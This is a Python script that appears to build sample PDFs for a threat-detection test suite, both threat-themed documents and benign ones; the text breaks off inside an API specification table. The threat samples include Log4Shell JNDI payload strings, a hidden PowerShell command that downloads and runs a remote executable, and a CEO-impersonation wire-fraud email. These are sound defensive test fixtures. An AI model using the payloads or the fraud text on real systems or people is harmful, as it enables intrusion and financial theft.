import os
import json
from pathlib import Path
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, HRFlowable
)
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.pdfgen import canvas

SAMPLE_DIR = Path(__file__).resolve().parent.parent / "sample_documents"
SAMPLE_DIR.mkdir(parents=True, exist_ok=True)

class NumberedCanvas(canvas.Canvas):
    """Canvas that adds running header and 'Page X of Y' footer."""
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._saved_page_states = []

    def showPage(self):
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        num_pages = len(self._saved_page_states)
        for state in self._saved_page_states:
            self.__dict__.update(state)
            self.draw_page_number(num_pages)
            canvas.Canvas.showPage(self)
        canvas.Canvas.save(self)

    def draw_page_number(self, page_count):
        self.saveState()
        self.setFont("Helvetica", 8)
        self.setFillColor(colors.HexColor("#64748B"))
        
        # Header (pages > 1)
        if self._pageNumber > 1:
            self.drawString(54, 11 * inch - 36, "ThreatLens Verification & Test Suite — Document Artifact")
            self.setStrokeColor(colors.HexColor("#CBD5E1"))
            self.setLineWidth(0.5)
            self.line(54, 11 * inch - 42, 8.5 * inch - 54, 11 * inch - 42)

        # Footer
        footer_text = f"Page {self._pageNumber} of {page_count}"
        self.drawRightString(8.5 * inch - 54, 36, footer_text)
        self.drawString(54, 36, "THREATLENS RESEARCH DATASET / INTERNAL VERIFICATION")
        self.setStrokeColor(colors.HexColor("#CBD5E1"))
        self.setLineWidth(0.5)
        self.line(54, 48, 8.5 * inch - 54, 48)
        self.restoreState()

def get_styles():
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle(
        "DocTitle",
        parent=styles["Heading1"],
        fontName="Helvetica-Bold",
        fontSize=20,
        leading=24,
        textColor=colors.HexColor("#0B1739"),
        spaceAfter=10
    )
    subtitle_style = ParagraphStyle(
        "DocSubtitle",
        parent=styles["Normal"],
        fontName="Helvetica",
        fontSize=11,
        leading=15,
        textColor=colors.HexColor("#64748B"),
        spaceAfter=18
    )
    h1_style = ParagraphStyle(
        "DocH1",
        parent=styles["Heading2"],
        fontName="Helvetica-Bold",
        fontSize=14,
        leading=18,
        textColor=colors.HexColor("#0B1739"),
        spaceBefore=12,
        spaceAfter=6
    )
    h2_style = ParagraphStyle(
        "DocH2",
        parent=styles["Heading3"],
        fontName="Helvetica-Bold",
        fontSize=11,
        leading=15,
        textColor=colors.HexColor("#2563EB"),
        spaceBefore=8,
        spaceAfter=4
    )
    body_style = ParagraphStyle(
        "DocBody",
        parent=styles["Normal"],
        fontName="Helvetica",
        fontSize=9.5,
        leading=13.5,
        textColor=colors.HexColor("#1E293B"),
        spaceAfter=7
    )
    callout_style = ParagraphStyle(
        "DocCallout",
        parent=styles["Normal"],
        fontName="Helvetica-Oblique",
        fontSize=9,
        leading=13,
        textColor=colors.HexColor("#334155"),
        backColor=colors.HexColor("#F1F5F9"),
        borderPadding=8,
        spaceAfter=8
    )
    code_style = ParagraphStyle(
        "DocCode",
        parent=styles["Normal"],
        fontName="Courier",
        fontSize=8.5,
        leading=12,
        textColor=colors.HexColor("#991B1B"),
        backColor=colors.HexColor("#FEF2F2"),
        borderPadding=6,
        spaceAfter=8
    )
    return {
        "title": title_style,
        "subtitle": subtitle_style,
        "h1": h1_style,
        "h2": h2_style,
        "body": body_style,
        "callout": callout_style,
        "code": code_style
    }

def build_pdf(filepath: Path, elements: list):
    doc = SimpleDocTemplate(
        str(filepath),
        pagesize=letter,
        leftMargin=54,
        rightMargin=54,
        topMargin=54,
        bottomMargin=54
    )
    doc.build(elements, canvasmaker=NumberedCanvas)
    print(f"[+] Generated PDF: {filepath.name}")

# ============================================================================
# 1. THREAT: Log4Shell Alert PDF
# ============================================================================
def generate_threat_log4shell_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Critical Threat Advisory: Apache Log4j (Log4Shell) Remote Code Execution", s["title"]),
        Paragraph("Advisory ID: CTI-ADV-2026-0044 | Severity: CRITICAL | Target: CVE-2021-44228", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#DC2626"), spaceAfter=14),

        Paragraph("Vulnerability Description & Attack Dynamics", s["h1"]),
        Paragraph(
            "Security operations centers have identified widespread, automated exploitation of the Log4Shell vulnerability "
            "(CVE-2021-44228) across enterprise public-facing applications. Adversaries are actively scanning perimeter Apache Solr, "
            "Elasticsearch, and VMware Horizon appliances using automated JNDI LDAP lookup strings.",
            s["body"]
        ),
        Paragraph(
            "Observed Payload Strings In-The-Wild:\n"
            "${jndi:ldap://203.0.113.99:1389/Exploit}\n"
            "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:ldap}://203.0.113.99:1389/a}\n"
            "${jndi:dns://203.0.113.99:53/log4j-test}",
            s["code"]
        ),
        Paragraph(
            "Upon successful parameter substitution, vulnerable JVM processes issue outbound LDAP callbacks to remote attacker "
            "infrastructure, downloading and executing secondary Bash droppers that stage cryptocurrency miners and Cobalt Strike implants.",
            s["body"]
        ),
        PageBreak(),

        Paragraph("Technical Indicators of Compromise (IoCs)", s["h1"]),
        Table([
            ["Indicator Value", "Type", "Threat Context", "Status"],
            ["203.0.113.99", "IPv4", "Malicious LDAP/JNDI Callback Server", "Malicious"],
            ["CVE-2021-44228", "CVE", "Log4Shell Unauthenticated RCE Flaw", "Critical"],
            ["hxxp://malicious-log4j-delivery[.]example[.]com/drop.sh", "URL", "Bash Dropper Script", "Malicious"],
            ["malicious-log4j-delivery[.]example[.]com", "Domain", "Staging Server Hostname", "Malicious"],
            ["a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0", "SHA256", "ELF CryptoMiner Binary", "Malicious"]
        ], colWidths=[205, 50, 165, 80], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#7F1D1D")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("MITRE ATT&CK Framework Mapping", s["h2"]),
        Paragraph("• <b>T1190 (Exploit Public-Facing Application)</b>: Initial remote code execution via JNDI injection.", s["body"]),
        Paragraph("• <b>T1059.004 (Unix Shell Script Interpreter)</b>: Execution of secondary dropper shell scripts.", s["body"]),
        Paragraph("• <b>T1071.001 (Web Protocols)</b>: Communication over HTTP/HTTPS for staging second-stage binaries.", s["body"]),
        PageBreak(),

        Paragraph("Recommended Emergency Containment", s["h1"]),
        Paragraph("1. <b>Library Upgrade</b>: Immediately upgrade log4j-core library to version 2.17.1 or later across all clusters.", s["body"]),
        Paragraph("2. <b>JVM Flag Mitigation</b>: Set system property log4j2.formatMsgNoLookups=true on legacy runtime JVM instances.", s["body"]),
        Paragraph("3. <b>WAF Rules</b>: Apply perimeter WAF pattern block rules inspecting HTTP User-Agent, X-Api-Version, and Referer headers.", s["body"]),
        Paragraph("4. <b>Firewall Egress Filtering</b>: Block outbound traffic to IP 203.0.113.99 and port 1389 on border security gateways.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: CRITICAL THREAT (Score: 9.8 / 10.0)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 2. THREAT: Data Exfiltration Covert C2 PDF
# ============================================================================
def generate_threat_exfiltration_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Digital Forensics Incident Report: High-Volume Data Exfiltration", s["title"]),
        Paragraph("Case Reference: IR-EXFIL-2026-9041 | Severity: HIGH | Host: DFS-CORE-02", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#DC2626"), spaceAfter=14),

        Paragraph("1. Incident Synopsis & Forensic Timeline", s["h1"]),
        Paragraph(
            "Between 01:00 UTC and 04:30 UTC on October 14, 2026, network detection monitors flagged anomalous, "
            "sustained high-volume egress traffic originating from the internal file server DFS-CORE-02 (IP: 10.200.4.55). "
            "Detailed deep-packet inspection revealed that the host was communicating with external adversary infrastructure "
            "using encrypted DNS tunneling and unauthorized SFTP connections.",
            s["body"]
        ),
        Paragraph(
            "Forensic Host Artifacts & Memory Inspection:\n"
            "Process spoolsv.exe was injected with malicious Cobalt Strike beacon shellcode.\n"
            "Adversaries dumped NTDS.dit password hashes using compromised Domain Administrator account 'svc-backup-admin'.\n"
            "Scheduled task 'SystemMaintenanceAudit' established persistence across reboots.",
            s["callout"]
        ),
        Paragraph(
            "Total volume exfiltrated: 14.8 Gigabytes compressed archive (.7z format) containing corporate financial models and customer records.",
            s["body"]
        ),
        PageBreak(),

        Paragraph("2. Indicators of Compromise (IoCs)", s["h1"]),
        Table([
            ["Indicator Value", "Type", "Threat Context", "Status"],
            ["192.0.2.144", "IPv4", "Adversary Staging Server IP", "Malicious"],
            ["exfil-drop-secure[.]example[.]com", "Domain", "Destination Drop Domain", "Malicious"],
            ["hxxps://exfil-drop-secure[.]example[.]com/incoming/stream.php", "URL", "Defanged C2 Listener URL", "Malicious"],
            ["5d41402abc4b2a76b9719d911017c592", "MD5", "Cobalt Strike Stager Hash", "Malicious"],
            ["9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "SHA256", "Injected Beacon Binary", "Malicious"]
        ], colWidths=[205, 50, 165, 80], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#7F1D1D")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("3. MITRE ATT&CK Tactics & Techniques", s["h2"]),
        Paragraph("• <b>T1048.003 (Exfiltration Over Alternative Protocol)</b>: Exfiltration over encrypted DNS and SFTP.", s["body"]),
        Paragraph("• <b>T1071.004 (DNS Communication)</b>: C2 beaconing using DNS query encapsulation.", s["body"]),
        Paragraph("• <b>T1053.005 (Scheduled Task)</b>: Persistence created under SystemMaintenanceAudit.", s["body"]),
        Paragraph("• <b>T1003.003 (NTDS Dumping)</b>: Compromise of active directory database secrets.", s["body"]),
        PageBreak(),

        Paragraph("4. Immediate Containment Actions Required", s["h1"]),
        Paragraph("1. <b>Session Termination</b>: Terminate all outbound sessions destined for 192.0.2.144 and domain exfil-drop-secure[.]example[.]com.", s["body"]),
        Paragraph("2. <b>Network Isolation</b>: Disconnect DFS-CORE-02 from the corporate LAN and initiate volatile memory acquisition.", s["body"]),
        Paragraph("3. <b>Password Rotation</b>: Execute global password rotation for all service accounts with Domain Admin privileges.", s["body"]),
        Paragraph("4. <b>EDR Blocklist</b>: Submit SHA256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 to endpoint blocklists.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: HIGH SEVERITY (Score: 8.8 / 10.0)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 3. THREAT: Malicious Macro Invoice Dropper PDF
# ============================================================================
def generate_threat_macro_invoice_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("EDR Incident Telemetry Log: Malicious Macro Execution", s["title"]),
        Paragraph("Event Log Reference: EDR-MACRO-2026-104 | Affected Host: FIN-WKS-04 | User: Accountant", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#DC2626"), spaceAfter=14),

        Paragraph("Incident Overview & Attack Vector", s["h1"]),
        Paragraph(
            "Enterprise EDR sensors detected unauthorized process spawning from Microsoft Excel on finance workstation FIN-WKS-04. "
            "A weaponized spreadsheet attachment disguised as an overdue invoice executed an embedded VBA macro upon user enablement, "
            "bypassing execution policies to invoke an obfuscated PowerShell payload.",
            s["body"]
        ),
        Paragraph(
            "Command-Line Process Telemetry:\n"
            "Parent: excel.exe (PID: 4688) -> Child: cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aHR0cDovL2JhZC1wYXlsb2Fk...\n"
            "PowerShell Action: Invoke-WebRequest -Uri hxxp://bad-payload-delivery[.]example[.]com/stage2.exe -OutFile C:\\Temp\\svchost_update.exe\n"
            "Execution: C:\\Temp\\svchost_update.exe --inject-explorer",
            s["code"]
        ),
        PageBreak(),

        Paragraph("Process Execution Timeline & Indicators", s["h1"]),
        Table([
            ["Indicator Value", "Type", "Threat Context", "Status"],
            ["Invoice_October_Overdue.xlsm", "Filename", "Weaponized Malicious Document", "Malicious"],
            ["hxxp://bad-payload-delivery[.]example[.]com/stage2.exe", "URL", "Stager Payload URL", "Malicious"],
            ["bad-payload-delivery[.]example[.]com", "Domain", "Attacker Payload Host", "Malicious"],
            ["198.51.100.42", "IPv4", "C2 Command & Control Server", "Malicious"],
            ["c4ca4238a0b923820dcc509a6f75849b", "MD5", "Dropped svchost_update.exe Trojan", "Malicious"]
        ], colWidths=[205, 50, 165, 80], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#7F1D1D")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("MITRE ATT&CK Mapping", s["h2"]),
        Paragraph("• <b>T1566.001 (Spearphishing Attachment)</b>: Delivery of weaponized macro invoice document.", s["body"]),
        Paragraph("• <b>T1204.002 (User Execution: Malicious File)</b>: User enabling active macro content in Office.", s["body"]),
        Paragraph("• <b>T1059.001 (Command and Scripting Interpreter: PowerShell)</b>: Encoded PowerShell dropper execution.", s["body"]),
        Paragraph("• <b>T1055 (Process Injection)</b>: Attempted injection into explorer.exe.", s["body"]),
        PageBreak(),

        Paragraph("Remediation & Forensic Containment", s["h1"]),
        Paragraph("1. <b>Endpoint Quarantine</b>: Immediately isolate workstation FIN-WKS-04 from internal subnets.", s["body"]),
        Paragraph("2. <b>Process Termination</b>: Terminate rogue child processes and remove C:\\Temp\\svchost_update.exe.", s["body"]),
        Paragraph("3. <b>Firewall Block</b>: Blacklist destination IP 198.51.100.42 and domain bad-payload-delivery[.]example[.]com.", s["body"]),
        Paragraph("4. <b>Group Policy Hardening</b>: Enforce Microsoft Office GPO disabling macros in files downloaded from external zones.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: HIGH SEVERITY (Score: 8.6 / 10.0)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 4. THREAT: Executive Wire Fraud BEC PDF
# ============================================================================
def generate_threat_executive_wire_fraud_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Urgent Executive Wire Authorization Request — BEC Incident", s["title"]),
        Paragraph("Incident: BEC-FRAUD-2026-09 | Classification: Business Email Compromise (Social Engineering)", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#DC2626"), spaceAfter=14),

        Paragraph("Message Interception & Header Analysis", s["h1"]),
        Paragraph(
            "Enterprise email security filters intercepted a high-priority executive impersonation message targeting the corporate treasury department. "
            "The sender spoofed the Chief Executive Officer's name using an external lookalike domain and demanded an urgent out-of-band wire transfer.",
            s["body"]
        ),
        Paragraph(
            "Email Header Details:\n"
            "Date: October 14, 2026 07:44 AM EST\n"
            "From: Arthur Vance, Chief Executive Officer <ceo-office-direct@corporate-holding[.]example[.]org>\n"
            "To: Elena Rostova, Senior Director of Corporate Treasury <elena.treasury@enterprise.example.com>\n"
            "Priority: HIGHEST / TIME-SENSITIVE / STRICTLY CONFIDENTIAL\n"
            "Subject: URGENT: Acquisition Earnest Deposit Wire ($485,000 USD)",
            s["callout"]
        ),
        Paragraph(
            "Body Transcript Excerpt:\n"
            "\"Elena, I am currently in closed-door executive arbitration regarding our strategic acquisition of a European logistics partner. "
            "Due to strict regulatory confidentiality covenants under European financial law, this transaction CANNOT be disclosed "
            "to other staff or processed through normal procurement channels at this stage. You must immediately execute an earnest deposit "
            "wire transfer in the amount of $485,000 USD to our appointed escrow agent prior to 11:00 AM EST today. "
            "Bypass the standard dual-authorization verification protocol for this single wire. I will personally provide retroactive sign-off tomorrow.\"",
            s["code"]
        ),
        PageBreak(),

        Paragraph("Extracted Fraud Indicators & Entities", s["h1"]),
        Table([
            ["Indicator Value", "Type", "Threat Context", "Status"],
            ["ceo-office-direct@corporate-holding[.]example[.]org", "Email", "Spoofed Executive Sender Address", "Malicious"],
            ["corporate-holding[.]example[.]org", "Domain", "Lookalike Adversary Domain", "Malicious"],
            ["escrow-liaison@acquisition-holdings[.]example[.]org", "Email", "Fraudulent Escrow Advisor", "Malicious"],
            ["acquisition-holdings[.]example[.]org", "Domain", "Bogus Holding Company Domain", "Malicious"],
            ["Global Merger Escrow Holdings Ltd (Acct: 9948-2819-0021)", "Financial", "Mule Bank Account Destination", "Fraudulent"]
        ], colWidths=[205, 50, 165, 80], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#7F1D1D")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("MITRE ATT&CK & Fraud Tactics", s["h2"]),
        Paragraph("• <b>T1656 (Impersonation)</b>: Impersonation of executive leadership to bypass standard controls.", s["body"]),
        Paragraph("• <b>T1566.002 (Spearphishing Link / Narrative)</b>: Coercive psychological pressure and artificial urgency.", s["body"]),
        Paragraph("• <b>T1598 (Spearphishing for Information / Authorization)</b>: Attempted fraudulent funds diversion.", s["body"]),
        PageBreak(),

        Paragraph("Immediate Fraud Prevention Actions", s["h1"]),
        Paragraph("1. <b>Payment Halt</b>: Confirm that zero wire transfers have been released to account 9948-2819-0021.", s["body"]),
        Paragraph("2. <b>Out-of-Band Verification</b>: Contact CEO Arthur Vance via documented corporate telephone directory.", s["body"]),
        Paragraph("3. <b>Mail Gateway Blacklist</b>: Add corporate-holding[.]example[.]org and acquisition-holdings[.]example[.]org to tenant blocklists.", s["body"]),
        Paragraph("4. <b>Treasury Alert</b>: Reiterate mandatory dual-custody verification policy across all treasury and accounting personnel.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: HIGH SEVERITY (Score: 8.4 / 10.0)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 5. SAFE: DevOps Release Changelog PDF
# ============================================================================
def generate_safe_devops_release_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Production DevOps Release Manifest & Changelog v3.2.1-stable", s["title"]),
        Paragraph("Governance: Corporate Security Policy | Audit: ISO/IEC 27001 Verified | Service: checkout-service", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#2563EB"), spaceAfter=14),

        Paragraph("1. Deployment Overview & Pipeline Governance", s["h1"]),
        Paragraph(
            "This release manifest documents the automated production deployment of enterprise-checkout-service version 3.2.1-stable. "
            "All software artifacts were compiled, scanned, and signed through the corporate GitOps continuous delivery pipeline. "
            "Deployment complies with annual compliance audit guidelines and corporate security policy.",
            s["body"]
        ),
        Paragraph(
            "Release Metadata & Verification:\n"
            "Release Version: v3.2.1-stable\n"
            "Release Date: October 14, 2026 10:00:00 UTC\n"
            "Deployed By: GitOps Automated Pipeline (ArgoCD)\n"
            "Source Repository: https://git.internal.lan/engineering/checkout-service\n"
            "Commit Hash: 7f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b\n"
            "Telemetry Endpoint: https://telemetry.internal.lan:4317",
            s["callout"]
        ),
        Paragraph("2. Automated Quality Assurance & Static Analysis", s["h1"]),
        Table([
            ["Metric Parameter", "Result Value", "Standard Threshold", "Compliance Status"],
            ["Unit Tests Executed", "412 Passed / 0 Failed", "100% Pass Rate", "Verified"],
            ["Integration Test Scenarios", "86 Passed / 0 Failed", "100% Pass Rate", "Verified"],
            ["Code Coverage Percentage", "94.6%", ">= 85.0%", "Exceeds Standard"],
            ["Static Security Flaws (SAST)", "0 High / 0 Critical", "Zero Tolerance", "Clean"]
        ], colWidths=[140, 120, 120, 120], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#1E3A8A")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),
        PageBreak(),

        Paragraph("3. Dependency Upgrades & Configuration Changes", s["h1"]),
        Paragraph(
            "All dependencies have been upgraded to patched, stable releases verified against vulnerability databases:",
            s["body"]
        ),
        Paragraph("• <b>fastapi</b>: Upgraded from 0.110.0 to 0.111.0 (Performance tuning and OpenAPI enhancements).", s["body"]),
        Paragraph("• <b>sqlalchemy</b>: Upgraded from 2.0.28 to 2.0.30 (Connection pooling optimizations).", s["body"]),
        Paragraph("• <b>pydantic</b>: Upgraded from 2.6.4 to 2.7.0 (Core serialization acceleration).", s["body"]),
        Spacer(1, 8),
        Paragraph("Configuration Modifications:", s["h2"]),
        Paragraph("• Database connection pool size adjusted to 25 instances with 3600-second Redis cache TTL.", s["body"]),
        Paragraph("• OpenTelemetry distributed tracing enabled with TLS encryption to internal monitoring hub.", s["body"]),
        Paragraph("• Release notes: Optimized PostgreSQL query execution plans, reducing p99 latency from 140ms to 42ms.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: SAFE / OPERATIONAL ARTIFACT (No Threats Detected)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 6. SAFE: Quarterly Budget Report PDF
# ============================================================================
def generate_safe_quarterly_budget_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Corporate IT Infrastructure Budget & Financial Ledger (2026-Q3)", s["title"]),
        Paragraph("Audit Standard: ISO/IEC 27001 Financial Governance | Department: Technology Operations", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#2563EB"), spaceAfter=14),

        Paragraph("1. Executive Financial Summary", s["h1"]),
        Paragraph(
            "This audited quarterly financial report outlines capital expenditures, SaaS licensing agreements, and infrastructure "
            "compute expenditures for Technology Operations during Q3 2026. All vendor procurements followed corporate security policy "
            "and were verified through annual compliance audit procedures.",
            s["body"]
        ),
        Paragraph("2. Approved Expense Line Items & Vendor Allocations", s["h1"]),
        Table([
            ["Cost Center", "Expense Category", "Vendor Name", "Budgeted ($)", "Actual ($)", "Variance ($)", "Status"],
            ["CC-101", "Cloud Infrastructure Hosting", "Amazon Web Services Inc", "145,000.00", "141,200.50", "-3,799.50", "Approved"],
            ["CC-101", "Security Endpoint Protection", "CrowdStrike Holdings", "38,000.00", "38,000.00", "0.00", "Approved"],
            ["CC-102", "Developer Tooling", "Atlassian Inc (Jira/Confluence)", "22,500.00", "22,500.00", "0.00", "Approved"],
            ["CC-102", "Code Collaboration", "GitHub Enterprise Services", "18,000.00", "18,000.00", "0.00", "Approved"],
            ["CC-103", "Corporate Identity & SSO", "Okta Identity Cloud", "28,000.00", "27,500.00", "-500.00", "Approved"],
            ["CC-104", "Enterprise Communication", "Slack / Salesforce", "16,500.00", "16,500.00", "0.00", "Approved"],
            ["CC-105", "External Compliance Audit", "Deloitte & Touche LLP", "65,000.00", "65,000.00", "0.00", "Approved"]
        ], colWidths=[55, 115, 120, 65, 65, 50, 45], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#1E3A8A")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 7.5),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),
        PageBreak(),

        Paragraph("3. Variance Analysis & Fiscal Controls", s["h1"]),
        Paragraph(
            "Overall technology expenditures remained 1.3% below allocated budget caps due to compute instance reservations "
            "and database instance right-sizing initiatives in AWS us-east-1 and eu-central-1 regions.",
            s["body"]
        ),
        Paragraph("• <b>Cloud Savings</b>: AWS compute optimization saved $3,799.50 against forecasted demand.", s["body"]),
        Paragraph("• <b>Identity & Security</b>: CrowdStrike and Okta license allocations operated at 100% capacity with zero variance.", s["body"]),
        Paragraph("• <b>Audit Assurance</b>: Deloitte & Touche completed annual SOC 2 Type II and ISO/IEC 27001 audit workstreams on schedule.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: SAFE / BENIGN FINANCIAL LEDGER (No Indicators Detected)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 7. SAFE: Remote Work Security Handbook PDF
# ============================================================================
def generate_safe_remote_work_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Global Enterprise IT Handbook: Remote Work Security Protocol", s["title"]),
        Paragraph("Document: HR-IT-GUIDE-2026 | Version: 4.1 | Standard: ISO/IEC 27001 Certified", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#2563EB"), spaceAfter=14),

        Paragraph("1. Purpose & Remote Work Philosophy", s["h1"]),
        Paragraph(
            "Enterprise embraces hybrid and flexible remote work while upholding our commitment to data privacy, client trust, "
            "and infrastructure integrity under corporate security policy. This guide details standard operating expectations for all "
            "home office environments and remote employee devices.",
            s["body"]
        ),
        Paragraph(
            "Standard Operating Core Expectations:\n"
            "• Connect to corporate Virtual Private Network (VPN) using managed client.\n"
            "• Authenticate via hardware FIDO2 key or approved authenticator push notification.\n"
            "• Never conduct corporate business or transmit proprietary data across unsecured public Wi-Fi.\n"
            "• Maintain strict physical workstation security and screen lock policies.",
            s["callout"]
        ),
        PageBreak(),

        Paragraph("2. Secure Network Access & VPN Operations", s["h1"]),
        Paragraph("• <b>Client Software</b>: Connect exclusively using the pre-configured GlobalProtect client on your managed laptop.", s["body"]),
        Paragraph("• <b>Corporate Portal Gateway</b>: The standard corporate portal URL is: https://vpn.internal.lan", s["body"]),
        Paragraph("• <b>Authentication Flow</b>: Single sign-on requires hardware FIDO2 key or Microsoft Authenticator number matching.", s["body"]),
        Paragraph("• <b>Split-Tunneling Policy</b>: All corporate application traffic is inspected through cloud access security brokers.", s["body"]),
        Spacer(1, 8),

        Paragraph("3. Workstation Maintenance & IT Support Channels", s["h1"]),
        Paragraph("• <b>Patch Management</b>: Operating system and security updates apply automatically during the 02:00 AM local window.", s["body"]),
        Paragraph("• <b>Application Restrictions</b>: Do not install unapproved software, torrent clients, or unauthorized browser extensions.", s["body"]),
        Paragraph("• <b>Clean Desk Policy</b>: Always lock screens (Windows Key + L) when leaving your workspace unattended.", s["body"]),
        Spacer(1, 8),
        Paragraph("Official Technical Support Contact Channels:", s["h2"]),
        Paragraph("• Self-Service Portal: https://helpdesk.internal.lan", s["body"]),
        Paragraph("• Support Email: it-support@internal.lan", s["body"]),
        Paragraph("• 24/7 Global Follow-the-Sun Support Hotline: Extension 4357 (HELP)", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: SAFE / BENIGN POLICY DOCUMENT (No Threats Detected)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# 8. SAFE: API Architecture Specification PDF
# ============================================================================
def generate_safe_api_architecture_pdf(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Enterprise Inventory REST API Specification (OpenAPI 3.0)", s["title"]),
        Paragraph("Specification: OpenAPI 3.0.3 | Version: 2.4.0 | Compliance: ISO/IEC 27001 Certified Standard", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#2563EB"), spaceAfter=14),

        Paragraph("1. API Architecture Overview & Governance", s["h1"]),
        Paragraph(
            "This technical specification outlines the RESTful contracts, operational endpoints, and schema definitions for the "
            "Enterprise Inventory Management microservice. The service enables real-time stock reservation and warehouse tracking "
            "under corporate security policy and annual compliance audit guidelines.",
            s["body"]
        ),
        Paragraph(
            "Cluster Routing & Environment Endpoints:\n"
            "Production Cluster URL: https://inventory-api.internal.lan/v2\n"
            "Staging Sandbox URL: https://staging-inventory.internal.lan/v2\n"
            "Developer Portal: https://developer.internal.lan\n"
            "Engineering Contact: inventory-guild@internal.lan",
            s["callout"]
        ),
        PageBreak(),

        Paragraph("2. Operational REST Endpoints", s["h1"]),
        Table([
            ["HTTP Method", "Endpoint Path", "Function Description", "Security Level"],
            ["GET", "/items", "Query available warehouse stock with category filtering", "OAuth 2.0 Bearer JWT"],
            ["POST", "/items/reserve", "Atomic inventory allocation and reservation", "OAuth 2.0 Bearer JWT"],
